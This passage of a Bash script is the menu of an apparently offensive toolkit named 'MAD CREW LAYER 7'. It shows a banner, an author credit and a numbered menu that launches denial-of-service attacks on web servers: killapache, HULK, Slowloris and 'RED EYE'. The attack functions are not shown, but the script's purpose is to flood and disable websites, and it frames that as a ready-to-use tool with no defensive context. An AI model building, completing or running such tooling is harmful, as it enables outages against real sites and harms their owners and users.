}

Take_input1()
{
clear
while :
do
clear                   
echo -e "${WHITE}"
echo -e "${WHITE}    ███╗   ███╗ █████╗ ██████╗      ██████╗██████╗ ███████╗██╗    ██╗
    ████╗ ████║██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔════╝██║    ██║
    ██╔████╔██║███████║██║  ██║    ██║     ██████╔╝█████╗  ██║ █╗ ██║
    ██║╚██╔╝██║██╔══██║██║  ██║    ██║     ██╔══██╗██╔══╝  ██║███╗██║
    ██║ ╚═╝ ██║██║  ██║██████╔╝    ╚██████╗██║  ██║███████╗╚███╔███╔╝
    ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝      ╚═════╝╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ 
                                                                 
    ██╗      █████╗ ██╗   ██╗███████╗██████╗     ███████╗            
    ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██║            
    ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝        ██╔╝            
    ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗       ██╔╝             
    ███████╗██║  ██║   ██║   ███████╗██║  ██║       ██║              
    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝       ╚═╝              
                                                                 
                     
                        CODED BY COLAK 
                  INSTAGRAM : @colak.offical

                                            "
    echo -e "${LIGHTBLUE}        [1]${WHITE}KILLAPACHE SCRIPT ${LIGHTBLUE} " 
    echo -e ""
    echo -e "${LIGHTBLUE}        [2]${WHITE}HULK - HTTP Unbearable Load${LIGHTBLUE}   "
    echo -e ""
    echo -e "${LIGHTBLUE}        [3]${WHITE}SLOWLORIS ${LIGHTBLUE}   "
    echo -e ""
    echo -e "${LIGHTBLUE}        [4]${WHITE}RED EYE ${LIGHTBLUE}   "
    echo -e ""
    echo -n -e "${RED}root@COLAK${WHITE}:${LIGHTBLUE}~/Desktop/M3d-Tool${WHITE}# "
    read yourch
    case $yourch in
      1) killapache ;;
      2) hulk ;;
      3) slowloris ;;
      4) RedEye ;;
      ex) echo "As you Command" ;  exit 1  ;;
      *) echo "HATALI RAKAM GIRDINIZ" ;
         echo "Enter Basarak Menuye Dönebilirsiniz . . ." ; read ;;
 esac
done # end_while
}
#
# Set trap to for CTRL+C interrupt i.e. Install our error handler
# When occurs it first it calls del_file() and then exit
#
trap exit_script 2
